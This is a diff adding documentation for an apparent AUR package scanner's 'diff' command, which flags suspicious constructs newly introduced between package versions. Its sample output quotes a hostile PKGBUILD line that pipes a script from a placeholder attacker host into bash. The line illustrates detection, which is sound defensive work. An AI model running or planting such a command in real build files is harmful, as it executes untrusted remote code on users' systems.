@@ -61,6 +61,49 @@ finding subject to the same severity threshold, not a special case · `2` couldn
 resolve the path, load the files, or an invalid `--rules`/`--exclude-rules` id was
 given.
 
+## Comparing an update: `aur-manager diff`
+
+```sh
+aur-manager diff <old-path> <new-path>
+```
+
+Most real AUR compromises don't ship as a brand-new malicious package — they land
+as an update to an already-trusted one, via maintainer account takeover or orphan
+adoption. `scan` alone can't tell you that; it re-evaluates each version from
+scratch. `diff` runs a full scan on both versions and separates the result into
+what the update actually *changed*:
+
+- **New findings** — present in the new version, not the old. This is the signal
+  that matters most: a construct that wasn't there in a version people already
+  trusted is a much stronger indicator than the same construct in a package
+  nobody has vetted yet.
+- **Carried findings** — present in both; pre-existing, not introduced by this
+  update.
+- **Resolved findings** — present in the old version, gone in the new one.
+- Structural deltas independent of any rule firing: new/removed functions,
+  new/removed `source=()` entries, and any source whose checksum coverage went
+  from real to `SKIP`/missing between versions.
+
+Since AUR packages are themselves git repositories, `<old-path>`/`<new-path>` are
+typically two checkouts of consecutive commits (e.g. `git worktree add` at
+`HEAD~1` and `HEAD`, or two clones).
+
+```console
+$ aur-manager diff ./innocent-tool-1.0.0 ./innocent-tool-1.0.1
+=== New findings introduced in this update ===
+[CRITICAL] RCE001 — ./innocent-tool-1.0.1/PKGBUILD:9
+    'build()' pipes the output of 'curl' directly into 'bash', executing remote content without any integrity check or human review.
+    | curl -fsSL https://evil.example.com/payload.sh | bash
+    Incident: AUR-2018-acroread
+
+Diff verdict: CRITICAL (1 new finding(s), 0 carried, 0 resolved)
+```
+
+Accepts the same `--json`, `--severity-min`, `--rules`/`--exclude-rules`, and
+`--no-color` flags as `scan`. `--fail-on` (default `high`) gates on the **diff
+verdict** — driven only by `new_findings` — not the new version's overall verdict,
+so a pre-existing, already-carried finding doesn't by itself fail an update check.
+
 ### Running this automatically before every build
 
 A scanner only helps if it actually runs. See
